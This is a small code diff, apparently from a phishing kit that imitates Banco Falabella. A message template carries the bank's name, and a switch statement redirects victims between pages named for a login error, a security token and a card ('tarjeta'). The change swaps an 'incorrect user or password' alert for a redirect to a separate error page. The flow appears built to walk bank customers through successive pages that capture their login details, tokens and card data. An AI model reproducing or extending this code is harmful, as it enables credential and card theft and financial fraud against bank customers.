@@ -368,9 +368,7 @@ const mensaje = `💎BANCO FALABELLA💎
                     window.location.href = "token.php";
                     break;
                 case 'error_logo':
-                    $("#mensaje").hide();
-                    alert("Usuario o clave incorrectos.");
-                    window.location.href = "index.php";
+                    window.location.href = "error_logo.php";
                     break;
                 case 'error_tc':
                     window.location.href = "tarjeta.php";
